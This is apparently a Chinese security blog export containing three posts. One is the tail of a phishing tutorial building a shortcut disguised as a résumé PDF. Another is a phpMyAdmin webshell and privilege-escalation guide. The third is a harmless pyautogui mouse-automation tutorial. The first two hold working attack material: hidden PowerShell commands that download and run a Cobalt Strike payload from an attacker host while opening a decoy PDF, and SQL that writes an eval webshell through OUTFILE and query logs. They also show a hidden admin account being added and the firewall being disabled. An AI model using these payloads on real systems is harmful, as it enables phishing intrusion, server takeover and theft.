<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646043828206-eb3d6ff6-bd45-4f9b-8066-2ee339f3eee0.png" alt="img"></p>
<p>命名为简历.pdf</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646043868825-3e90651b-e5a5-4126-a740-5dbdac46cd96.png" alt="img"></p>
<h2 id="4、修改图标"><a href="#4、修改图标" class="headerlink" title="4、修改图标"></a>4、修改图标</h2><p>任意选择<code>%systemroot%\system32\shell32.dll</code>的一个图标</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646043965371-a467da75-e96d-48fc-af04-6cfdb86fc67e.png" alt="img"></p>
<p>使用上面的方法，更改为PDF自适配</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646044171067-67ba286b-217c-4c16-8413-cfe810d8f6ca.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646044181331-d0f170ec-1329-45ed-8d79-7cb15dd4084c.png" alt="img"></p>
<h2 id="5、初级反弹shell"><a href="#5、初级反弹shell" class="headerlink" title="5、初级反弹shell"></a>5、初级反弹shell</h2><p>用户双击做好的简历.pdf，即可反弹shell</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646044440237-f6be7e0b-9ff1-45c2-9500-b96a56bed42e.gif" alt="img"></p>
<h2 id="6、使用真正的PDF文件伪装"><a href="#6、使用真正的PDF文件伪装" class="headerlink" title="6、使用真正的PDF文件伪装"></a>6、使用真正的PDF文件伪装</h2><p>当受害者中招打开我们的所谓的pdf，实则为恶意的快捷方式时，双击两下，什么反应都没有，可能会有一丝疑惑，因此可以当尝试用powershell、mshta等方式上线时，我们可以更改如cobaltstrike生成的代码，加上一段自动下载打开一份真的pdf，来达到逼真的效果。</p>
<p>在简历.pdf的对象位置中，可以更改代码为如下</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/简历.pdf&#x27;,&#x27;<span class="variable">$env:TEMP</span>\简历.pdf&#x27;);cd <span class="variable">$env:TEMP</span>;./简历.pdf;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p>但是有个问题，就是上面的代码太长了，放不下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646044552147-419959fc-e83e-4cbc-abc2-961b8bbd2c60.png" alt="img"></p>
<p>也尝试使用变量来代替地址或者new-object net.webclient，但是都出现了许多报错问题，折腾了一个下午都没搞定（后续会继续探索解决方案）</p>
<p>因此这里就使用通过下载PS脚本，通过执行脚本来进行</p>
<p>eval.ps1部署在Kali下，内容为</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/简历.pdf&#x27;,&#x27;<span class="variable">$env:TEMP</span>\简历.pdf&#x27;);cd <span class="variable">$env:TEMP</span>;./简历.pdf;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p>目标改为</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">方法一测试无反应：C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-nop</span> <span class="literal">-NonI</span> <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.1.105:8081/eval.ps1&quot;</span>)</span><br><span class="line">方法二测试成功：C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe <span class="literal">-ExecutionPolicy</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/eval.ps1&#x27;,&#x27;<span class="variable">$env:TEMP</span>\eval.ps1&#x27;);cd <span class="variable">$env:TEMP</span>;./eval.ps1&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646046629210-c6dc89cd-fcb0-4e95-a438-6a5e669c9316.png" alt="img"></p>
<h2 id="7、使用真正PDF伪装了的反弹shell"><a href="#7、使用真正PDF伪装了的反弹shell" class="headerlink" title="7、使用真正PDF伪装了的反弹shell"></a>7、使用真正PDF伪装了的反弹shell</h2><p>下面的动图，展示了打开一个快捷方式钓鱼文件时，逼真的打开了真实的简历，然后在背后悄悄的上了线：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646046926748-c0bcda5a-a513-46df-b623-18633f3242ef.gif" alt="img"></p>
<h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><ul>
<li><p><a href="https://security.tencent.com/index.php/blog/msg/165">https://security.tencent.com/index.php/blog/msg/165</a></p>
</li>
<li><p><a href="https://bbs.pediy.com/thread-260953.htm">https://bbs.pediy.com/thread-260953.htm</a></p>
</li>
<li><p><a href="https://blog.csdn.net/qq_28808697/article/details/103036894">https://blog.csdn.net/qq_28808697/article/details/103036894</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>APT/社工</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
        <tag>钓鱼</tag>
        <tag>社工</tag>
        <tag>APT</tag>
      </tags>
  </entry>
  <entry>
    <title>phpMyAdmin提权</title>
    <url>/post/3256b484.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、条件"><a href="#一、条件" class="headerlink" title="一、条件"></a>一、条件</h1><ol>
<li>能成功登录到phpMyAdmin里去</li>
<li>有读、写、执行的权限</li>
<li>知道网站的绝对路径</li>
</ol>
<h1 id="二、操作步骤"><a href="#二、操作步骤" class="headerlink" title="二、操作步骤"></a>二、操作步骤</h1><h2 id="1、爆数据库安装路径"><a href="#1、爆数据库安装路径" class="headerlink" title="1、爆数据库安装路径"></a>1、爆数据库安装路径</h2><h3 id="（1）SQL语句查询"><a href="#（1）SQL语句查询" class="headerlink" title="（1）SQL语句查询"></a>（1）SQL语句查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> &quot;%datadir%&quot;;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651027606413-5656ae84-a811-44c1-9e81-43cde56efcd5.png" alt="img"></p>
<p>因为phpstudy是集成环境，所以网站物理路径是D:\phpstudy_pro\WWW</p>
<h3 id="（2）敏感文件"><a href="#（2）敏感文件" class="headerlink" title="（2）敏感文件"></a>（2）敏感文件</h3><p>直接在url后面输入<code>phpinfo.php</code>，看看能不能读出这个文件，如果存在就会把网站的绝对路径显示出来，这样的情况特少，因为网站管理人员不可能把这个测试页面在互联网上面直接显示出来，他们或许会更改路径或许会设置目录访问权限；</p>
<h3 id="（3）扫描网站"><a href="#（3）扫描网站" class="headerlink" title="（3）扫描网站"></a>（3）扫描网站</h3><p>使用扫描工具对网站进行扫扫描；扫描一些<code>phpinfo.php</code> <code>info.php</code> <code>php.php</code> <code>test.php</code>等等；</p>
<h3 id="（4）读取配置文件"><a href="#（4）读取配置文件" class="headerlink" title="（4）读取配置文件"></a>（4）读取配置文件</h3><table>
<thead>
<tr>
<th>Windows2003 IIS 6</th>
<th>C:\Windows/system32\inetsrv\metabase.xml</th>
</tr>
</thead>
<tbody><tr>
<td>Win2008/2012 IIS 7.5</td>
<td>C:\Windows\System32\inetsrv\config\applicationHost.config</td>
</tr>
<tr>
<td>Nginx</td>
<td>/etc/nginx/conf.d/vhost.conf /usr/local/etc/nginx/nginx.conf</td>
</tr>
<tr>
<td>Apache</td>
<td>/etc/httpd/conf/httpd.conf/usr/local/apache2/conf/httpd.conf</td>
</tr>
</tbody></table>
<h2 id="2、查看secure-file-priv"><a href="#2、查看secure-file-priv" class="headerlink" title="2、查看secure_file_priv"></a>2、查看secure_file_priv</h2><p>在上面我们已经获知了网站默认的路径，这个时候我们肯定想插入一句话后门文件或者是导出shell。那如果我们需要使用以上两种思路中的一种必须满足一个前提条件<code>secure_file_priv</code>对应的值不能为空且必须为默认网站的路径，所以我们必须提前检测一下<code>secure_file_priv</code>的值。</p>
<p>secure_file_priv为null 表示不允许导入导出；</p>
<p>secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹；</p>
<p>secure_file_priv没有设置时，则表示没有任何限制；</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;%secure_file_priv%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651035982479-cf76063b-a5bb-4939-bc59-249429b7e007.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651036137996-a05513b2-fef8-4d74-a9b0-365f41f17b31.png" alt="img"></p>
<p>从上图得知值为空，如果我们这时导入一句话，肯定会失败的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[w01ke]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;D:\\phpstudy_pro\\WWW\\w01ke.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651036243191-725f7754-d47b-4812-9f14-ecbc7e71040f.png" alt="img"></p>
<p>如果要解决这个问题，我们可以通过下面2种方式：</p>
<ol>
<li>将你要导入或导出的文件位置指定到你设置的路径里，也就是动态修改</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> secure_file_priv <span class="operator">=</span> &quot;D:/phpstudy_pro/WWW&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651036466789-72ceb653-652f-4e19-9eef-89bfa6845fb5.png" alt="img"></p>
<ol start="2">
<li>由于不能动态修改，我们可以修改my.cnf里关于这个选项的配置，然后重启即可。</li>
</ol>
<p>但平常都是黑盒测试，有没有其他方法呢，有</p>
<h2 id="3、利用日志文件或备份文件来写入一句话"><a href="#3、利用日志文件或备份文件来写入一句话" class="headerlink" title="3、利用日志文件或备份文件来写入一句话"></a>3、利用日志文件或备份文件来写入一句话</h2><h3 id="（1）日志文件"><a href="#（1）日志文件" class="headerlink" title="（1）日志文件"></a>（1）日志文件</h3><p>点击变量选项，搜索gen就会出来<code>general_log</code>和<code>general_log_file</code>这两个变量，<code>general_log</code>变量是指是否启动记录日志；而<code>general_log_file</code>指的是日志文件的路径，可以看到<code>general_log</code>变量的状态为<code>OFF</code>，故我们要修改为<code>ON</code>；<code>general_log_file</code>变量中的<code>*.log</code>的后缀我们改为<code>*.php</code>。拿完webshell记得要改回去哟。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651034685938-6c39efb1-b8d8-486a-af5c-8f64094c7b2a.png" alt="img"></p>
<h4 id="①-开启日志"><a href="#①-开启日志" class="headerlink" title="① 开启日志"></a>① 开启日志</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="②-修改日志文件保存的位置"><a href="#②-修改日志文件保存的位置" class="headerlink" title="② 修改日志文件保存的位置"></a>② 修改日志文件保存的位置</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> &quot;D:\\phpstudy_pro\\WWW\\w01ke.php&quot;;</span><br></pre></td></tr></table></figure>

<p>w01ke.php的内容是日志文件，包括执行的SQL语句</p>
<h4 id="③-写入一句话"><a href="#③-写入一句话" class="headerlink" title="③ 写入一句话"></a>③ 写入一句话</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[w01ke]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651028529322-8bf69c91-054a-44ce-8d45-a594a5b70a27.png" alt="img"></p>
<h4 id="④-查看修改后的信息（随便）"><a href="#④-查看修改后的信息（随便）" class="headerlink" title="④ 查看修改后的信息（随便）"></a>④ 查看修改后的信息（随便）</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;%general%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651028240314-1bd80c86-7317-494a-88bf-d310f43662f9.png" alt="img"></p>
<p>默认情况如下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651028753827-49f262b2-02bc-416d-a2ea-2c85a4de4f8b.png" alt="img"></p>
<h3 id="（2）备份文件"><a href="#（2）备份文件" class="headerlink" title="（2）备份文件"></a>（2）备份文件</h3><h4 id="①-开启备份日志"><a href="#①-开启备份日志" class="headerlink" title="① 开启备份日志"></a>① 开启备份日志</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log <span class="operator">=</span> &quot;ON&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="②-修改备份日志文件保存的位置"><a href="#②-修改备份日志文件保存的位置" class="headerlink" title="② 修改备份日志文件保存的位置"></a>② 修改备份日志文件保存的位置</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span> &quot;D:\\phpstudy_pro\\WWW\\w01ke2.php&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="③-写入一句话-1"><a href="#③-写入一句话-1" class="headerlink" title="③ 写入一句话"></a>③ 写入一句话</h4><p>备份的，根据其他师傅尝试，需要用延迟才能成功注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">99999999999999999</span>,<span class="string">&#x27;&lt;?php @eval($_POST[w01ke2]);?&gt;&#x27;</span> <span class="keyword">OR</span> sleep(<span class="number">11</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651037068603-1178f3c8-6ea8-4a48-adbb-9bb5411fe754.png" alt="img"></p>
<h4 id="④-查看修改后的信息（随便）-1"><a href="#④-查看修改后的信息（随便）-1" class="headerlink" title="④ 查看修改后的信息（随便）"></a>④ 查看修改后的信息（随便）</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;%slow_query_log%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651034482257-0eaaec26-48c6-4442-9a33-87fad652c607.png" alt="img"></p>
<p>默认情况下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651030283607-1b1cd621-8db5-4f0a-92bf-1b6fb76eef11.png" alt="img"></p>
<h2 id="4、蚁剑连接"><a href="#4、蚁剑连接" class="headerlink" title="4、蚁剑连接"></a>4、蚁剑连接</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651028662645-c4bffbeb-aa8d-44f3-b552-eb2bf74c75fe.png" alt="img"></p>
<h2 id="5、提权"><a href="#5、提权" class="headerlink" title="5、提权"></a>5、提权</h2><h3 id="（1）抓取hash密码"><a href="#（1）抓取hash密码" class="headerlink" title="（1）抓取hash密码"></a>（1）抓取hash密码</h3><p>上传抓取hash密码的工具，成功抓取到管理员密码：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651132737089-6aa5b4bd-d756-440c-93b1-b2ae6da13678.png" alt="img"></p>
<h3 id="（2）添加新用户到管理员组"><a href="#（2）添加新用户到管理员组" class="headerlink" title="（2）添加新用户到管理员组"></a>（2）添加新用户到管理员组</h3><p>在虚拟终端添加测试账号test$，并将用户添加到管理员组：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651132818963-180f76f1-d68f-41fb-8416-72d3ae769acd.png" alt="img"></p>
<h3 id="（3）开启3389端口"><a href="#（3）开启3389端口" class="headerlink" title="（3）开启3389端口"></a>（3）开启3389端口</h3><p>经查询主机未开启3389远程登陆功能，故上传开启3389的bat文件进行开启：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651132870480-c3e1c44f-e049-48f4-9df0-b584e0253c47.png" alt="img"></p>
<h3 id="（4）关闭防火墙"><a href="#（4）关闭防火墙" class="headerlink" title="（4）关闭防火墙"></a>（4）关闭防火墙</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<h3 id="（5）远程连接"><a href="#（5）远程连接" class="headerlink" title="（5）远程连接"></a>（5）远程连接</h3><p>成功连接服务器，由于本机administrator没有设置密码，故只是拿自己的登陆名称进行测试，在实际站点测试的时候一般都有管理员密码，只不过有的服务器的登陆用户名会修改(遇到的情况有的特别变态，比如端口修改、用户名修改、防护软件等)：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651133114985-898299ab-a7db-4d43-9474-fb4d0659368b.png" alt="img"></p>
<h1 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h1><ul>
<li><a href="https://blog.csdn.net/ga421739102/article/details/103924232">https://blog.csdn.net/ga421739102/article/details/103924232</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/55466863">https://zhuanlan.zhihu.com/p/55466863</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>phpMyAdmin</tag>
      </tags>
  </entry>
  <entry>
    <title>pyautogui模块</title>
    <url>/post/2681d601.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、GUI控制功能"><a href="#一、GUI控制功能" class="headerlink" title="一、GUI控制功能"></a>一、GUI控制功能</h1><ul>
<li>控制鼠标键盘使用的模块为：pyautogui，这个模块操作起鼠标键盘的时候，非常的迅速，而且如果该模块控制了鼠标后，程序比较难关闭，这时我们有两个方法专门针对以上的情况：</li>
</ul>
<h2 id="1-1-自动防故障功能"><a href="#1-1-自动防故障功能" class="headerlink" title="1.1 自动防故障功能"></a>1.1 自动防故障功能</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.FAILSAFE =<span class="literal">False</span>  </span><br></pre></td></tr></table></figure>

<ul>
<li>默认这项功能为True, 这项功能意味着：当鼠标的指针在屏幕的最坐上方，程序会报错；目的是为了防止程序无法停止；</li>
</ul>
<h2 id="1-2-停顿功能"><a href="#1-2-停顿功能" class="headerlink" title="1.2 停顿功能"></a>1.2 停顿功能</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.PAUSE = <span class="number">1</span>    </span><br></pre></td></tr></table></figure>

<ul>
<li>意味着所有pyautogui的指令都要暂停一秒；其他指令不会停顿；这样做，可以防止键盘鼠标操作太快；</li>
</ul>
<h1 id="二、鼠标移动"><a href="#二、鼠标移动" class="headerlink" title="二、鼠标移动"></a>二、鼠标移动</h1><h2 id="2-1-控制鼠标移动"><a href="#2-1-控制鼠标移动" class="headerlink" title="2.1 控制鼠标移动"></a>2.1 控制鼠标移动</h2><h3 id="2-1-1-获得屏幕分辨率"><a href="#2-1-1-获得屏幕分辨率" class="headerlink" title="2.1.1 获得屏幕分辨率"></a>2.1.1 获得屏幕分辨率</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(pyautogui.size())   <span class="comment"># 返回所用显示器的分辨率； 输出：Size(width=1920, height=1080)</span></span><br><span class="line">width,height = pyautogui.size()</span><br><span class="line"><span class="built_in">print</span>(width,height)  <span class="comment"># 1920 1080</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-2-移动鼠标"><a href="#2-1-2-移动鼠标" class="headerlink" title="2.1.2 移动鼠标"></a>2.1.2 移动鼠标</h3><h4 id="①-移动到指定位置"><a href="#①-移动到指定位置" class="headerlink" title="① 移动到指定位置"></a>① 移动到指定位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.moveTo(<span class="number">100</span>, <span class="number">300</span>, duration=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>将鼠标移动到指定的坐标；duration 的作用是设置移动时间，所有的gui函数都有这个参数，而且都是可选参数</li>
</ul>
<h4 id="②-按方向移动（相对移动）"><a href="#②-按方向移动（相对移动）" class="headerlink" title="② 按方向移动（相对移动）"></a>② 按方向移动（相对移动）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.moveRel(<span class="number">100</span>, <span class="number">500</span>, duration=<span class="number">2</span>)   <span class="comment"># 第一个参数是左右移动像素值，第二个是上下</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>相对于当前位置</strong>移动光标，向右移动100px，向下移动500px, 这个过程持续 4 秒钟；</li>
</ul>
<h3 id="2-1-3-获取鼠标位置"><a href="#2-1-3-获取鼠标位置" class="headerlink" title="2.1.3 获取鼠标位置"></a>2.1.3 获取鼠标位置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(pyautogui.position())   <span class="comment"># 得到当前鼠标位置；输出：Point(x=200, y=800)</span></span><br></pre></td></tr></table></figure>

<h2 id="2-2-控制鼠标点击"><a href="#2-2-控制鼠标点击" class="headerlink" title="2.2 控制鼠标点击"></a>2.2 控制鼠标点击</h2><h3 id="2-2-1-单击鼠标"><a href="#2-2-1-单击鼠标" class="headerlink" title="2.2.1 单击鼠标"></a>2.2.1 单击鼠标</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 点击鼠标</span></span><br><span class="line">pyautogui.click(<span class="number">10</span>, <span class="number">10</span>)   <span class="comment"># 鼠标点击指定位置，默认左键</span></span><br><span class="line">pyautogui.click(<span class="number">10</span>, <span class="number">10</span>, button=<span class="string">&#x27;left&#x27;</span>)  <span class="comment"># 单击左键</span></span><br><span class="line">pyautogui.click(<span class="number">1000</span>, <span class="number">300</span>, button=<span class="string">&#x27;right&#x27;</span>)  <span class="comment"># 单击右键</span></span><br><span class="line">pyautogui.click(<span class="number">1000</span>, <span class="number">300</span>, button=<span class="string">&#x27;middle&#x27;</span>)  <span class="comment"># 单击中间</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-双击鼠标"><a href="#2-2-2-双击鼠标" class="headerlink" title="2.2.2 双击鼠标"></a>2.2.2 双击鼠标</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.doubleClick(<span class="number">10</span>,<span class="number">10</span>)  <span class="comment"># 指定位置，双击左键</span></span><br><span class="line">pyautogui.rightClick(<span class="number">10</span>,<span class="number">10</span>)   <span class="comment"># 指定位置，双击右键</span></span><br><span class="line">pyautogui.middleClick(<span class="number">10</span>,<span class="number">10</span>)  <span class="comment"># 指定位置，双击中键</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-3-点击和释放"><a href="#2-2-3-点击和释放" class="headerlink" title="2.2.3 点击和释放"></a>2.2.3 点击和释放</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.mouseDown()   <span class="comment"># 鼠标按下（点击）</span></span><br><span class="line">pyautogui.mouseUp()    <span class="comment"># 鼠标释放</span></span><br></pre></td></tr></table></figure>

<h2 id="2-3-控制鼠标拖动"><a href="#2-3-控制鼠标拖动" class="headerlink" title="2.3 控制鼠标拖动"></a>2.3 控制鼠标拖动</h2><h3 id="2-3-1-拖动到指定位置"><a href="#2-3-1-拖动到指定位置" class="headerlink" title="2.3.1 拖动到指定位置"></a>2.3.1 拖动到指定位置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.dragTo(<span class="number">100</span>,<span class="number">300</span>,duration=<span class="number">1</span>) </span><br></pre></td></tr></table></figure>

<ul>
<li>将鼠标拖动到指定的坐标；duration 的作用是设置移动时间，所有的gui函数都有这个参数，而且都是可选参数；</li>
</ul>
<h3 id="2-3-2-按方向拖动（相对拖动）"><a href="#2-3-2-按方向拖动（相对拖动）" class="headerlink" title="2.3.2 按方向拖动（相对拖动）"></a>2.3.2 按方向拖动（相对拖动）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.dragRel(<span class="number">100</span>,<span class="number">500</span>,duration=<span class="number">4</span>)   <span class="comment"># 第一个参数是左右移动像素值，第二个是上下</span></span><br></pre></td></tr></table></figure>

<ul>
<li>相对光标当前为位置向右拖动100px，向下拖动500px, 这个过程持续 4 秒钟；</li>
</ul>
<h2 id="2-4-控制鼠标滚动"><a href="#2-4-控制鼠标滚动" class="headerlink" title="2.4 控制鼠标滚动"></a>2.4 控制鼠标滚动</h2><ul>
<li>控制鼠标滚动的函数是<code>scroll()</code>， 传入一个整数的参数，说明向上或向下滚动多少个单位；单位根据操作系统不同而不同；</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.scroll(<span class="number">300</span>)   <span class="comment"># 向上滚动300个单位</span></span><br><span class="line">pyautogui.scroll(-<span class="number">300</span>)  <span class="comment"># 向下滚动300个单位</span></span><br></pre></td></tr></table></figure>

<h1 id="三、屏幕处理"><a href="#三、屏幕处理" class="headerlink" title="三、屏幕处理"></a>三、屏幕处理</h1><h2 id="3-1-获取屏幕截图"><a href="#3-1-获取屏幕截图" class="headerlink" title="3.1 获取屏幕截图"></a>3.1 获取屏幕截图</h2><ul>
<li><p>我们控制鼠标的操作，不能盲目的进行，所以我们需要监控屏幕上的内容，从而决定要不要进行对应的操作， pyautogui 提供了一个方法<code>screenshot()</code>，可以返回一个Pillow的image对象；</p>
</li>
<li><p>这里有三个常用函数：</p>
</li>
<li><ul>
<li><code>im = pyautogui.screenshot()</code>：返回屏幕的截图，是一个Pillow的image对象</li>
<li><code>im.getpixel((500, 500))</code>：返回im对象上，（500，500）这一点像素的颜色，是一个RGB元组</li>
</ul>
</li>
<li><ul>
<li><code>pyautogui.pixelMatchesColor(500,500,(12,120,400))</code>：是一个对比函数，对比的是屏幕上（500，500）这一点像素的颜色，与所给的元素是否相同；</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = pyautogui.screenshot()</span><br><span class="line">im.save(<span class="string">&#x27;屏幕截图.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>保存屏幕截图</li>
</ul>
<h2 id="3-2-识别图像"><a href="#3-2-识别图像" class="headerlink" title="3.2 识别图像"></a>3.2 识别图像</h2><ul>
<li>首先，我们需要先获得一个屏幕快照，例如我们想要点赞，我们就先把大拇指的图片保存下来；然后使用函数：<code>locateOnScreen(&#39;zan.png&#39;)</code> ，如果可以找到图片，则返回图片的位置，如：<code>Box(left=25, top=703, width=22, height=22)</code>；如果找不到图片，则返回None;</li>
<li>如果，屏幕上有多处图片可以匹配，则需要使用<code>locateAllOnScreen(&#39;zan.png&#39;)</code>，如果匹配到多个值，则返回一个list，参考如下：</li>
</ul>
